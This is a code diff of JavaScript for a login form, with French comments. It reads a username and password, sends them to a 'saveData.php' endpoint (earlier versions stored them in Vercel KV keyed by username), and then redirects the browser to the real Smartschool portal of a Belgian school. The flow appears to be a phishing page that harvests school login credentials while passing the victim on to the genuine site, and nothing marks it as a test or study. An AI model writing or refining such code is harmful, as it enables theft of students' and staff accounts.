@@ -1,4 +1,4 @@
-async function submitForm(event) {
+function submitForm(event) {
     event.preventDefault(); // Empêche le rechargement de la page
 
     const username = document.getElementById('username').value;
@@ -9,19 +9,23 @@ async function submitForm(event) {
         password: password
     };
 
-    try {
-        // Enregistrer les données dans Vercel KV
-        await saveDataToKV(data);
-        console.log('Données envoyées avec succès');
-
-        // Rediriger vers Smartschool
-        window.location.href = 'https://ebr-secondaire.smartschool.be';
-    } catch (error) {
+    // Save data to saveData.php
+    fetch('saveData.php', {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify(data)
+    })
+    .then(response => response.text())
+    .then(data => {
+        console.log('Données envoyées avec succès:', data);
+       
+       
+    })
+    .catch(error => {
         console.error('Erreur:', error);
-        alert('Une erreur est survenue. Veuillez réessayer.');
-    }
+    });
+        window.location.href = "https://ebr-secondaire.smartschool.be";
 }
 
-async function saveDataToKV(data) {
-    await kv.set(data.username, data.password);
-}
